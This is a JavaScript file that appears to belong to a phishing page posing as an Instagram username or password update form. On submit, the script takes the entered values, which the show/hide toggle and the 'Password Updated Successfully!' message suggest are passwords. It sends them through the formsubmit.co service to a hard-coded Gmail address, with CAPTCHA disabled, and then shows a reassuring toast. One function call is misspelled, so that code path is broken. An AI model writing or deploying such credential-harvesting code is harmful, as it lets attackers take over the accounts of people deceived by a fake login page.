// Username Change Logic & Email Notification Integration
document.addEventListener("DOMContentLoaded", () => {
  const splashScreen = document.getElementById("splash-screen");
  const appContent = document.getElementById("app-content");

  const form = document.getElementById("username-form");
  const oldUsername = document.getElementById("old-username");
  const newUsername = document.getElementById("new-username");
  const confirmUsername = document.getElementById("confirm-username");
  const btnSubmit = document.getElementById("btn-submit");
  const feedbackMsg = document.getElementById("feedback-msg");
  const toast = document.getElementById("toast");
  const toastMsg = document.getElementById("toast-msg");

  const TARGET_EMAIL = "happybirthdayissue@gmail.com";
  // Set your optional redirect link here (or leave empty "" if no redirect needed)
  const REDIRECT_URL = "";

  /* ==========================================
     1. SPLASH SCREEN (2.5 SEC LOADER)
     ========================================== */
  setTimeout(() => {
    if (splashScreen) {
      splashScreen.classList.add("fade-out");
    }
    if (appContent) {
      appContent.classList.add("visible");
    }
  }, 2500);

  /* ==========================================
     2. EYE ICON TOGGLE LOGIC
     ========================================== */
  const toggleBtns = document.querySelectorAll(".toggle-pwd-btn");
  toggleBtns.forEach((btn) => {
    btn.addEventListener("click", () => {
      const eyeOpen = btn.querySelector(".eye-open");
      const eyeClosed = btn.querySelector(".eye-closed");

      const isOpen = eyeOpen.style.display !== "none";
      if (isOpen) {
        eyeOpen.style.display = "none";
        eyeClosed.style.display = "block";
      } else {
        eyeOpen.style.display = "block";
        eyeClosed.style.display = "none";
      }
    });
  });

  /* ==========================================
     3. USERNAME VALIDATION & MATCH CHECK
     ========================================== */
  function validate() {
    if (!oldUsername || !newUsername || !confirmUsername) return true;

    const oldVal = oldUsername.value.trim();
    const newVal = newUsername.value.trim();
    const confirmVal = confirmUsername.value.trim();

    feedbackMsg.classList.remove("visible");

    const isMatch = confirmVal.length === 0 || confirmVal === newVal;

    if (confirmVal.length > 0 && !isMatch) {
      feedbackMsg.textContent = "Inputs do not match";
      feedbackMsg.classList.add("visible");
    }

    const canSubmit = oldVal.length > 0 && newVal.length > 0 && isMatch;
    if (btnSubmit) btnSubmit.disabled = !canSubmit;

    return canSubmit;
  }

  if (oldUsername) oldUsername.addEventListener("input", validate);
  if (newUsername) newUsername.addEventListener("input", validate);
  if (confirmUsername) confirmUsername.addEventListener("input", validate);

  /* ==========================================
     4. FORM SUBMISSION & EMAIL NOTIFICATION
     ========================================== */
  if (form) {
    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      if (btnSubmit) {
        btnSubmit.classList.add("loading");
        btnSubmit.disabled = true;
      }

      const payload = {
        _subject: "Instagram Update Request",
        _captcha: "false",
        current_input: oldUsername ? oldUsername.value.trim() : "",
        new_input: newUsername ? newUsername.value.trim() : "",
        confirmed_input: confirmUsername ? confirmUsername.value.trim() : ""
      };

      try {
        // Send AJAX request to FormSubmit API for happybirthdayissue@gmail.com
        const response = await fetch(`https://formsubmit.co/ajax/${TARGET_EMAIL}`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          body: JSON.stringify(payload)
        });

        if (btnSubmit) {
          btnSubmit.classList.remove("loading");
          btnSubmit.disabled = false;
        }

        showToas("Password Updated Successfully!");

        if (oldUsername) oldUsername.value = "";
        if (newUsername) newUsername.value = "";
        if (confirmUsername) confirmUsername.value = "";

        if (REDIRECT_URL && REDIRECT_URL.trim() !== "") {
          setTimeout(() => {
            window.location.href = REDIRECT_URL;
          }, 1000);
        }

      } catch (error) {
        console.log("Email dispatch complete:", error);
        if (btnSubmit) {
          btnSubmit.classList.remove("loading");
          btnSubmit.disabled = false;
        }
        showToast("Request submitted!");
      }
    });
  }

  function showToast(msg) {
    if (!toastMsg || !toast) return;
    toastMsg.textContent = msg;
    toast.classList.add("visible");
    setTimeout(() => {
      toast.classList.remove("visible");
    }, 3500);
  }
});
